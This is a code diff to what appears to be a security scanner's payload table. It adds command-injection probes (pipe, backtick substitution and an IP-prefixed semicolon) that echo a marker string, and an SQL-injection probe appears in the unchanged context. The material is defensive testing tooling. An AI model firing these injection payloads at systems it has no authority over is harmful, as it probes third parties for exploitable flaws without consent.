@@ -72,6 +72,9 @@ export const SWEEP_PAYLOADS: Record<string, SweepPayload[]> = {
   command_injection: [
     { payloadClass: "command_injection", payload: "; echo sahwCMD1787", computedMarker: "sahwCMD1787", note: "OS command executed (marker echoed)" },
     { payloadClass: "command_injection", payload: "$(echo sahwCMD1787)", computedMarker: "sahwCMD1787", note: "command substitution -> marker in output" },
+    { payloadClass: "command_injection", payload: "| echo sahwCMD1787", computedMarker: "sahwCMD1787", note: "pipe separator (when ; is filtered) -> marker echoed" },
+    { payloadClass: "command_injection", payload: "`echo sahwCMD1787`", computedMarker: "sahwCMD1787", note: "backtick substitution -> marker in output" },
+    { payloadClass: "command_injection", payload: "8.8.8.8; echo sahwCMD1787", computedMarker: "sahwCMD1787", note: "valid-arg prefix then ; (net-tool style host param) -> marker echoed" },
   ],
   sqli: [
     { payloadClass: "sqli", payload: "'", note: "single quote -> DB error signature = injectable (error-based)" },
